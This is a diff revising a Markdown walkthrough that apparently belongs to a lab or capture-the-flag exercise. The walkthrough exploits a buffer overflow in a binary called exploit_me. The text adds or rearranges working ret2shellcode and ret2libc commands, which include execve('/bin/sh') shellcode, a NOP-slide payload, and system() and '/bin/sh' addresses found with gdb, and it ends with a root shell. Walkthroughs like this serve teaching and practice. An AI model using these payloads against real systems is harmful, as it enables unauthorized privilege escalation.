@@ -878,7 +878,7 @@ With this knowledge in mind and the fact that the original `C` file was compiled
 
 ## Ret2shellcode
 
-To make a ret2shellcode, we will use the following logic:
+To craft a ret2shellcode, we will use the following logic:
 ```
 shellcode + padding + address of shellcode
 ```
@@ -902,56 +902,53 @@ Since we want to overwrite the return address, we need to write 140 bytes of pad
 
 Finally we need to find the address of the shellcode which we can do with `gdb`. That gives us the address `0xbffff8a8`.
 
-Here's the final command:
+*I'm not showing how to do it because `gdb` seems unreliable with finding the exact address of the shellcode.
+If you're having trouble finding the exact address of the shellcode, you can use the following logic instead:*
+```
+NOP slide (size of padding) + shellcode + any address within the NOP slide
+
+./exploit_me `python -c 'print("\x90" * (140 - 23) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xbf\xff\xf8\xba"[::-1])'`
+
+Here I picked the address 0xbffff8ba, which is within the NOP slide, but you can pick any address within the NOP slide.
+```
+
+Here's the final command of our original logic:
 ```
 ./exploit_me `python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "."*(140 - 23) + "\xbf\xff\xf8\xa8"[::-1])'`
 ```
 
 ## Ret2libc
-```
-./exploit_me `python -c 'print("."*140 + "\xb7\xe6\xb0\x60"[::-1] + "BEAN" + "\xb7\xf8\xcc\x58"[::-1])'`
-```
 
+To construct a ret2libc, we will use the following logic:
 ```
 padding + address of system + any address + address of "/bin/sh"
 
-// Although I wrote any address, if you want the program to exit properly, you need to put the address of exit. I didn't bother with it since it works anyway.
+// Although I wrote any address, if you want the program to terminate properly, you need to put the address of exit.
 ```
 
+Let's find the address of system with `gdb`:
 ```
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
-```s
+```
 
-how to find /bin/sh
-https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb
+Then we need to find the address of the string "/bin/sh" with `gdb`:
 
-(gdb) info proc map
-process 4735
-Mapped address spaces:
-
-        Start Addr   End Addr       Size     Offset objfile
-         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
-         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
-        0xb7e2b000 0xb7e2c000     0x1000        0x0
-        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
-        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
-        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
-        0xb7fd2000 0xb7fd5000     0x3000        0x0
-        0xb7fdb000 0xb7fdd000     0x2000        0x0
-        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
-        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
-        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
-        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
-        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+*Learn how to find the address of "/bin/sh" [here](https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb)*
+```
 (gdb) find 0xb7e2b000,0xc0000000,"/bin/sh"
 0xb7f8cc58
 1 pattern found.
 ```
 
+Therefore the final command is:
+```
+./exploit_me `python -c 'print("."*140 + "\xb7\xe6\xb0\x60"[::-1] + "BEAN" + "\xb7\xf8\xcc\x58"[::-1])'`
+```
+
 # We are root
 
-After executing on of the two exploits, we are now root!
+After executing one of the two exploits, we are now root!
 ```
 # whoami
 root
